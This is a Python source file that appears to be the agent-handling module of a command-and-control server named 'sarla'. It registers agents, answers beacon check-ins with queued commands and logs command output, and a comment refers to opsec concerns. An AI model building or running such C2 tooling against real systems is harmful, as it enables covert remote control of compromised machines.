from base64 import b64decode
from sarla.server.src.registration import register
from sarla.server.src.utils import settings
from sarla.server.src.utils import patch


def process_agent(data, dictionary):
    unformatted_data = str(b64decode(data))
    unformatted_data = unformatted_data[2:len(unformatted_data)]
    unformatted_data = unformatted_data[:-1]
    seperated_data = unformatted_data.split(':')

    identifier = seperated_data[0]
    data = seperated_data[1]

    if identifier == 'register':
        key = register(data, dictionary)
        return key
    else:
        for key in dictionary:
            if str(identifier) == str(dictionary[key]['key']):
                if str(data) == "beacon":
                    print(settings.command_queue_table)
                    for x, y in settings.command_queue_table.items():
                        print(x, y)
                        if x == dictionary[key]['id']:
                            if len(y) > 0:
                                command_patch = patch.convert_command_to_patch(y)
                                del settings.command_queue_table[x]
                                return command_patch
                    pass
                else:
                    pass
            elif str(identifier) == "output": # Note technically this can have some opsec concerns I should probably clean auth up 
                print("Command output received: ", data)

        return "roger"